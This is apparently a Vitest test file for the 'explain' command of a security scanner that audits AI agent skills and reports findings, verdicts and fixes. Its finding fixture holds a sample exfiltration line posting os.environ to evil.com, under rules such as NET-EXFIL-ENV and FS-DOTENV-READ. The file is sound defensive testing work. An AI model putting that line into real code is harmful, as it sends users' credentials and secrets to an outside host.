import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { MockInstance } from 'vitest';
import stripAnsi from './helpers/strip-ansi.js';
import type { Enrichment, Finding, Skill, SkillSummary } from '../packages/cli/src/types.js';

vi.mock('../packages/cli/src/discovery/index.js', () => ({
  clearPlugins: vi.fn(),
  initDefaultPlugins: vi.fn(),
  discoverAll: vi.fn(),
}));

vi.mock('../packages/cli/src/rules/engine.js', () => ({
  runRules: vi.fn(),
}));

vi.mock('../packages/cli/src/rules/index.js', () => ({
  ALL_RULES: [],
}));

vi.mock('../packages/cli/src/enrich/index.js', () => ({
  ENRICHMENT_ENABLED: false,
  enrichSkillWithOutcomes: vi.fn(),
  enrichAll: vi.fn(),
  skippedEnrichmentOutcomes: vi.fn((sources: string[]) =>
    sources.map((source) => ({
      source,
      status: 'skipped-offline',
      reason: 'offline mode is active',
    }))
  ),
  summarizeEnrichmentOutcomes: vi.fn((outcomes: Array<{ status: string }>) => {
    if (outcomes.some((o) => o.status === 'found' || o.status === 'stale-cache')) return 'found';
    if (outcomes.some((o) => o.status === 'unavailable')) return 'unavailable';
    return 'no-metadata';
  }),
}));

vi.mock('../packages/cli/src/score.js', () => ({
  scoreFindings: vi.fn(),
}));

vi.mock('../packages/cli/src/output/json.js', () => ({
  renderJson: vi.fn((result: unknown) => JSON.stringify(result)),
}));

import { discoverAll } from '../packages/cli/src/discovery/index.js';
import { enrichSkillWithOutcomes } from '../packages/cli/src/enrich/index.js';
import { runRules } from '../packages/cli/src/rules/engine.js';
import { scoreFindings } from '../packages/cli/src/score.js';
import { runExplain } from '../packages/cli/src/commands/explain.js';

function makeSkill(overrides: Partial<Skill> = {}): Skill {
  return {
    id: 'skill-abc',
    agentId: 'claude-code',
    name: 'test-skill',
    path: '/home/user/.claude/skills/test-skill',
    manifestPath: null,
    format: 'SKILL.md',
    scope: 'user',
    treeSha256: 'deadbeef',
    ...overrides,
  };
}

function makeSummary(overrides: Partial<SkillSummary> = {}): SkillSummary {
  return {
    critical: 0,
    high: 0,
    medium: 0,
    low: 0,
    info: 0,
    score: 100,
    verdict: 'PASS',
    mandatoryFail: [],
    allowlisted: false,
    ...overrides,
  };
}

function makeFinding(overrides: Partial<Finding> = {}): Finding {
  return {
    ruleId: 'NET-EXFIL-ENV',
    severity: 'critical',
    category: 'network-exfil',
    file: 'SKILL.md',
    line: 14,
    column: 1,
    snippet: 'requests.post("http://evil.com", json=dict(os.environ))',
    message: 'Outbound HTTP transmission of os.environ.',
    fix: 'Remove credential exfiltration.',
    cwe: ['CWE-200'],
    ...overrides,
  };
}

function makeEnrichmentResult(enrichment: Enrichment = {}) {
  return {
    enrichment,
    outcomes: [
      {
        source: 'skillsSh' as const,
        status: enrichment.skillsSh === undefined ? ('no-metadata' as const) : ('found' as const),
      },
      {
        source: 'github' as const,
        status: enrichment.github === undefined ? ('no-metadata' as const) : ('found' as const),
      },
      {
        source: 'depsdev' as const,
        status: enrichment.depsdev === undefined ? ('no-metadata' as const) : ('found' as const),
      },
    ],
  };
}

describe('runExplain', () => {
  let stdoutChunks: string[];
  let stderrChunks: string[];
  let processExitSpy: MockInstance<[code?: string | number | null | undefined], never>;

  beforeEach(() => {
    stdoutChunks = [];
    stderrChunks = [];
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk) => {
      stdoutChunks.push(String(chunk));
      return true;
    });
    vi.spyOn(process.stderr, 'write').mockImplementation((chunk) => {
      stderrChunks.push(String(chunk));
      return true;
    });
    processExitSpy = vi.spyOn(process, 'exit').mockImplementation((() => {
      throw new Error('process.exit called');
    }) as never);
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('renders skill name as header when found by exact name match', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('test-skill');
    expect(out).toContain('Agent:     Claude Code');
    expect(out).toContain('PASS');
  });

  it('renders findings sorted by severity', async () => {
    const findings = [
      makeFinding({ ruleId: 'FS-DOTENV-READ', severity: 'medium' }),
      makeFinding({ ruleId: 'NET-EXFIL-ENV', severity: 'critical' }),
    ];
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue(findings);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary({ critical: 1, medium: 1, score: 72, verdict: 'REVIEW' }));
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    const critIdx = out.indexOf('NET-EXFIL-ENV');
    const medIdx = out.indexOf('FS-DOTENV-READ');
    expect(critIdx).toBeLessThan(medIdx);
  });

  it('exits with code 1 when verdict is FAIL', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([makeFinding()]);
    vi.mocked(scoreFindings).mockReturnValue(
      makeSummary({ critical: 1, score: 0, verdict: 'FAIL', mandatoryFail: ['NET-EXFIL-ENV'] })
    );
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await expect(runExplain('test-skill', { offline: true })).rejects.toThrow('process.exit called');
    expect(processExitSpy).toHaveBeenCalledWith(1);
  });

  it('exits with code 1 when skill not found', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill({ name: 'other-skill' })]);

    await expect(runExplain('nonexistent', { offline: true })).rejects.toThrow('process.exit called');
    expect(processExitSpy).toHaveBeenCalledWith(1);
    const err = stripAnsi(stderrChunks.join(''));
    expect(err).toContain('nonexistent');
    expect(err).toContain('skill-audit list');
  });

  it('shows "No issues found" when findings are empty and verdict is PASS', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('No issues found');
  });

  it('renders rm -rf next step when verdict is FAIL', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([makeFinding()]);
    vi.mocked(scoreFindings).mockReturnValue(
      makeSummary({ critical: 1, score: 0, verdict: 'FAIL', mandatoryFail: ['NET-EXFIL-ENV'] })
    );
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await expect(runExplain('test-skill', { offline: true })).rejects.toThrow('process.exit called');

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('rm -rf');
  });

  it('--json emits parseable JSON and does not call process.exit', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true, json: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(() => JSON.parse(out)).not.toThrow();
    const parsed = JSON.parse(out);
    expect(parsed.schema_version ?? parsed.schemaVersion).toBeTruthy();
    expect(processExitSpy).not.toHaveBeenCalled();
  });

  it('--json includes security-education context hints for likely security skills', async () => {
    vi.mocked(discoverAll).mockResolvedValue([
      makeSkill({ name: 'security-auditor', path: '/tmp/security-auditor' }),
    ]);
    vi.mocked(runRules).mockResolvedValue([makeFinding()]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary({ critical: 1, info: 1, score: 75 }));

    await runExplain('security-auditor', { offline: true, json: true });

    const parsed = JSON.parse(stripAnsi(stdoutChunks.join('')));
    const findings = parsed.skills[0].findings as Array<{ ruleId: string }>;
    expect(findings.map((finding) => finding.ruleId)).toEqual([
      'NET-EXFIL-ENV',
      'CTX-SECURITY-EDUCATION',
    ]);
    expect(scoreFindings).toHaveBeenCalledWith(
      expect.arrayContaining([
        expect.objectContaining({ ruleId: 'NET-EXFIL-ENV' }),
        expect.objectContaining({ ruleId: 'CTX-SECURITY-EDUCATION', severity: 'info' }),
      ]),
      'deadbeef'
    );
  });

  it('matches skill by case-insensitive partial name', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill({ name: 'MyComplexSkill' })]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('complex', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('MyComplexSkill');
  });

  it('does not run or render enrichment while disabled', async () => {
    const enrichment: Enrichment = {
      github: { stars: 3, ageDays: 10, contributors: 2 },
    };
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult(enrichment));

    await runExplain('test-skill', {});

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).not.toContain('Enrichment');
    expect(out).not.toContain('3 stars');
    expect(enrichSkillWithOutcomes).not.toHaveBeenCalled();
  });

  it('does not render disabled GitHub enrichment contributors', async () => {
    const enrichment: Enrichment = {
      github: { stars: 3, ageDays: 10, contributors: null },
    };
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult(enrichment));

    await runExplain('test-skill', {});

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).not.toContain('contributors unknown');
    expect(out).not.toContain('0 contributors');
    expect(enrichSkillWithOutcomes).not.toHaveBeenCalled();
  });

  it('does not explain disabled enrichment when metadata would be absent', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', {});

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).not.toContain('Enrichment');
    expect(out).not.toContain('skills.sh');
    expect(out).not.toContain('deps.dev');
    expect(enrichSkillWithOutcomes).not.toHaveBeenCalled();
  });

  it('does not explain disabled enrichment when lookup would be unavailable', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue({
      enrichment: {},
      outcomes: [
        { source: 'skillsSh', status: 'unavailable' },
        { source: 'github', status: 'unavailable' },
        { source: 'depsdev', status: 'unavailable' },
      ],
    });

    await runExplain('test-skill', {});

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).not.toContain('Enrichment');
    expect(out).not.toContain('skills.sh');
    expect(out).not.toContain('deps.dev');
    expect(enrichSkillWithOutcomes).not.toHaveBeenCalled();
  });

  it('hidden --offline compatibility flag does not mention enrichment', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).not.toContain('offline mode is active');
    expect(out).not.toContain('Enrichment');
    expect(enrichSkillWithOutcomes).not.toHaveBeenCalled();
  });

  it('shows finding snippet with pipe-prefix lines', async () => {
    const finding = makeFinding({ snippet: 'line one\nline two' });
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([finding]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary({ critical: 1, score: 75, verdict: 'REVIEW' }));
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('│');
    expect(out).toContain('line one');
    expect(out).toContain('line two');
  });

  it('labels finding detail lines in human output', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([makeFinding()]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary({ critical: 1, score: 75, verdict: 'REVIEW' }));
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('Location: SKILL.md:14');
    expect(out).toContain('Evidence:');
    expect(out).toContain('Issue: Outbound HTTP transmission of os.environ.');
    expect(out).toContain('Fix: Remove credential exfiltration.');
  });
});
